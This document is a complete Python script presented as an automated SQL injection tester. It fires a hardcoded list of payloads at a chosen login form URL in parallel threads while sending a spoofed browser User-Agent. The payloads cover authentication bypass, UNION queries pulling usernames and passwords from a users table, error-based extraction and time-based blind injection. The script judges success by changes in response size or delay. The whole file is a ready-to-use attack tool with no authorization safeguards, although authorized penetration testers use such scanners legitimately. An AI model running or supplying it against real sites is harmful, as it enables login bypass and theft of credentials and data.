#!/usr/bin/env python3
import requests
import time
import argparse
import logging
import threading

# Configure logging
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

# Expanded SQL injection payload list, now with `#` and `--` comment styles
PAYLOADS = [
    # Authentication bypass payloads
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 'x'='x' --",
    "' OR 'x'='x' #",
    "\" OR \"1\"=\"1\" --",
    "\" OR \"1\"=\"1\" #",
    # UNION-based payloads
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL #",
    "' UNION ALL SELECT NULL, NULL --",
    "' UNION ALL SELECT NULL, NULL #",
    "' UNION SELECT username, password FROM users --",
    "' UNION SELECT username, password FROM users #",
    "' UNION SELECT 'admin', 'password' --",
    "' UNION SELECT 'admin', 'password' #",
    # Error-based payloads
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) #",
    "' AND UPDATEXML(NULL, CONCAT(0x7e, (SELECT VERSION()), 0x7e), NULL) --",
    "' AND UPDATEXML(NULL, CONCAT(0x7e, (SELECT VERSION()), 0x7e), NULL) #",
    # Time-based blind SQLi
    "' AND SLEEP(5) --",
    "' AND SLEEP(5) #",
    "' OR SLEEP(5) --",
    "' OR SLEEP(5) #",
    "' OR IF(1=1, SLEEP(5), 0) --",
    "' OR IF(1=1, SLEEP(5), 0) #",
    "' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --",
    "' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) #",
    # MSSQL delay-based payloads
    "'; WAITFOR DELAY '0:0:5' --",
    "'; WAITFOR DELAY '0:0:5' #"
]

def send_request(url, data, headers, timeout):
    """
    Sends a POST request and returns the response length and time taken.
    """
    try:
        start_time = time.time()
        response = requests.post(url, data=data, headers=headers, timeout=timeout)
        elapsed_time = time.time() - start_time
        return len(response.text), elapsed_time, response.text
    except requests.exceptions.RequestException as e:
        logging.error(f"Request error: {e}")
        return None, None, None

def get_baseline_response(url, username_field, password_field, headers, timeout):
    """
    Obtains a baseline response using a normal login attempt.
    """
    logging.info("[*] Getting baseline response...")
    data = {username_field: "test_user", password_field: "test_pass"}
    response_length, response_time, _ = send_request(url, data, headers, timeout)

    if response_length is None:
        logging.error("[!] Failed to obtain baseline response.")
        return None, None

    logging.info(f"[*] Baseline response length: {response_length} bytes, time: {response_time:.2f}s")
    return response_length, response_time

def test_payload(url, payload, username_field, password_field, headers, timeout, baseline_length, baseline_time, success_indicator):
    """
    Tests a single SQL injection payload and determines its effectiveness.
    """
    logging.info(f"[*] Testing payload: {payload}")
    data = {username_field: payload, password_field: "password"}
    
    response_length, response_time, response_text = send_request(url, data, headers, timeout)

    if response_length is None:
        return "ERROR"

    length_diff = abs(response_length - baseline_length)
    time_diff = response_time - baseline_time

    # Success based on user-provided indicator
    if success_indicator and success_indicator in response_text:
        logging.info(f"[SUCCESS] Payload succeeded: {payload}")
        return "SUCCESS"

    # Heuristic detection
    elif length_diff > 30 or time_diff > 4:
        logging.warning(f"[POSSIBLE SQLi] Response changed significantly for payload: {payload}")
        logging.warning(f"    Response length: {response_length} bytes (baseline: {baseline_length})")
        logging.warning(f"    Elapsed: {response_time:.2f}s (baseline: {baseline_time:.2f}s)")
        return "POSSIBLE SQLi"

    else:
        logging.info(f"[FAILED] No significant change detected for payload: {payload}")
        return "FAILED"

def worker_thread(url, payload, username_field, password_field, headers, timeout, baseline_length, baseline_time, success_indicator, results):
    """
    Thread function to execute a payload test.
    """
    result = test_payload(url, payload, username_field, password_field, headers, timeout, baseline_length, baseline_time, success_indicator)
    results.append(result)

def main():
    parser = argparse.ArgumentParser(description="Automated SQL Injection Tester (Hardcoded Payloads)")
    parser.add_argument("--url", required=True, help="Target URL (e.g., https://example.com/login)")
    parser.add_argument("--username_field", default="username", help="Name of the username field")
    parser.add_argument("--password_field", default="password", help="Name of the password field")
    parser.add_argument("--indicator", help="String indicating a successful login (if known)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    args = parser.parse_args()

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # Get baseline response
    baseline_length, baseline_time = get_baseline_response(args.url, args.username_field, args.password_field, headers, args.timeout)
    if baseline_length is None:
        logging.error("[!] Exiting due to baseline failure.")
        return

    # Multi-threaded execution
    threads = []
    results = []

    logging.info("[*] Testing SQL injection payloads...\n")

    for payload in PAYLOADS:
        thread = threading.Thread(
            target=worker_thread,
            args=(args.url, payload, args.username_field, args.password_field, headers, args.timeout, baseline_length, baseline_time, args.indicator, results)
        )
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    # Results summary
    total_tests = len(PAYLOADS)
    success_count = results.count("SUCCESS")
    possible_count = results.count("POSSIBLE SQLi")
    fail_count = results.count("FAILED")

    logging.info("\n=== Testing Summary ===")
    logging.info(f"Total payloads tested: {total_tests}")
    logging.info(f"Successful payloads (indicator found): {success_count}")
    logging.info(f"Possible SQLi payloads (heuristic detection): {possible_count}")
    logging.info(f"Failed payloads: {fail_count}")

if __name__ == "__main__":
    main()
